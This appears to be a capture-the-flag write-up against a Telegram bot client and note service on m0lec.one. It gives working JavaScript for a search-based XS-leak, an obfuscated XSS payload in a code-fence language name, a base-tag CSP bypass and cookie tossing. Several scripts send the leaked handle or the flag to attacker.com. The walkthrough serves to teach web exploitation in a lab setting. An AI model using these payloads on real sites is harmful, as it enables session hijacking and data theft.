# Find the telegram bot handle

It's possible to leak the handle of the bot exploiting the `/location` route.

## Script to extract the hadle one character at a time:
```javascript
<script>

name = ''

wins = []

str = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
for (var i = 0; i < str.length; i++) {
  c = str.charAt(i)
  console.log('https://telegrambotclient.m0lec.one/locations?search='+name+c)
  r = window.open('https://telegrambotclient.m0lec.one/locations?search='+name +c)
  wins.push(r)
}


setTimeout(() => {
  // Read the number of iframes loaded
    for (var i = 0; i < wins.length; i++) {
        if (wins[i].length>0){
            x = str.charAt(i)
            console.log(x)
            // leak the char
            fetch('https://attacker.com/leak?'+name+x)
        }
        wins[i].close()
    }
    }, 1000);

</script>
```

# XSS in telegram messages

The `/messages` route is vulnerable to xss on the programming language name used for the syntax highlighting feature.

## Payload to send as a telegram message to the bot to exploit the xss:
````
```python id=abc tabindex=1 onfocus=document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,101,118,105,108,46,106,115,39,62,60,47,115,99,114,105,112,116,62))  
ciao
```
````
This payload causes the execution of `https://attacker.com/evil.js` when the bot visits `/messages#abc`.



# Self XSS in the note service

When creating a note, the text value is not escaped.

By bypassing the CSP it's possible to obtain a self-xss on the note app domain.

## Payload:
```
<base href="https://attacker.com">
```

By changing the base address the browser will fetch the scripts in the page from the attacker domain.

These scripts are allowed by the CSP nonce.



# Subdomain takeover

From the xss on the telegram client it's possible to override the session cookie for the note subdomain.

In this way it's possible to exploit the self-xss in the note subdomain and fetch the flag in the same origin.

## Script for cookie override

```javascript
w = window.open('http://note.m0lec.one/note?id=1','flag')
newcookie = 'YOUR NOTE SESSION COOKIE'
document.cookie = 'session=' + newcookie + '; domain=.m0lec.one; path=/note'
document.location = 'http://note.m0lec.one:8080/note?id=2' //self-xss
```

## Script on note subdomain

```javascript
w = window.open('','flag')
flag = w.document.getElementsByTagName('p')[0].innerText
fetch('https://attacker.com/flag?'+flag)
```
